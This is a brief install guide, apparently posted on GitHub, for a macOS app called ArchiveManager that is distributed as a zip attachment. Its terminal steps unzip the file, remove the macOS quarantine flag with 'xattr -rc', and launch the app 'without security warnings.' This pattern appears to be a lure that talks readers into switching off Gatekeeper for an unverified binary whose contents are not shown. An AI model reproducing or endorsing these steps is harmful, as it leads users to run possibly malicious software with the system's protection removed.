Download the desktop application from here (only compatible with MacOS): [ArchiveManager.zip](https://github.com/user-attachments/files/20624900/ArchiveManager.zip)

## How to Run ArchiveManager on Your Mac

1. Open the **Terminal** app.  
2. Navigate to the folder where you downloaded the zip file, for example:  
   `cd ~/Documents`  
3. Unzip the file by running:  
   `unzip ArchiveManager.zip`  
   When prompted with:  
   `replace __MACOSX/._ArchiveManager.app? [y]es, [n]o, [A]ll, [N]one, [r]ename:`  
   type `A` and press Enter to replace all files.  
4. Remove macOS security quarantine flag by running:  
   `xattr -rc ArchiveManager.app`  
5. Finally, open the app by running:  
   `open ArchiveManager.app`  

The app should launch without security warnings.

